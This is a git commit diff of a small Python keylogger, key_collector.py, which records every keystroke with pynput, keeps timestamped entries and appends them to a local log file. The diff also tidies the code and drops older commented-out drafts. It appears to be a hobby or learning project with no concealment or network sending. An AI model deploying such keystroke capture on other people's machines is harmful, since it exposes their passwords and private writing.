7e8058f5512c6c461118aa042ea422549872954b
effi_fertig <fefertig@icloud.com>
2025-06-22 10:34:21 +0300

    made some upgrades i think

--- key_collector.py
+++ key_collector.py
@@ -2,14 +2,12 @@ from pynput.keyboard import Key, Listener
 import datetime
 pressed_keys = []
 log_dict = {}
-print(len(log_dict))
-
 
 def on_press(key):
     global pressed_keys
 
     pressed_keys.append(str(key))
-    print(pressed_keys)
+    # print(pressed_keys)
     if pressed_keys[-4:] == ["'s'","'h'","'o'","'w'"]:
         for time, value in log_dict.items():
             print(time + '\n' + '  ' + value)
@@ -22,7 +20,7 @@ def on_press(key):
         print("There are more than one log entries, writing to file and removing the last one.")
         not_now = list(log_dict.keys())[-2]
         print(not_now)
-        write_file(not_now)
+        write_file(key=not_now,file='logger_effi.txt')
         del log_dict[not_now]
         print(log_dict)
 
@@ -52,13 +50,11 @@ def logger(keys):
     else:
         log_dict[now] = data_str
         print(log_dict)
-    # write_file(log_dict)
 
 
-def write_file(key):
-    print(log_dict)
-    with open('logger.txt', 'a') as f:
-            f.write(key + '\n' + '  ' + log_dict[key] + '\n')
+def write_file(key,file):
+    with open(file, 'a') as f:
+        f.write(key + '\n' + '  ' + log_dict[key] + '\n')
 
 
 def on_release(key):
@@ -69,27 +65,3 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
 print(log_dict)
-
-    # if type(key) == keyboard.Key:
-    #     if key == keyboard.Key.space:
-    #         pressed_key.append(" ")
-    #     elif key == keyboard.Key.enter:
-    #         pressed_key.append("\n")
-    #     elif key == keyboard.Key.backspace and pressed_key:
-    #         del pressed_key[-1]
-    #     elif key == keyboard.Key.tab:
-    #         pressed_key.append("    ")
-    # else:
-    #     pressed_key.append(str(key))
-
-# את הפקודות ייבאתי מ- https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
-
-# key_listener= keyboard.Listener(on_press=typing)
-# key_listener.start()
-# # הוספתי כאן מגבלת זמן להרצת התוכנה כי לא הצלחתי לעשות יציאה נוחה
-# time.sleep(60)
-# key_listener.stop()
-
-
-# text= ''.join(pressed_key)
-# print (text)
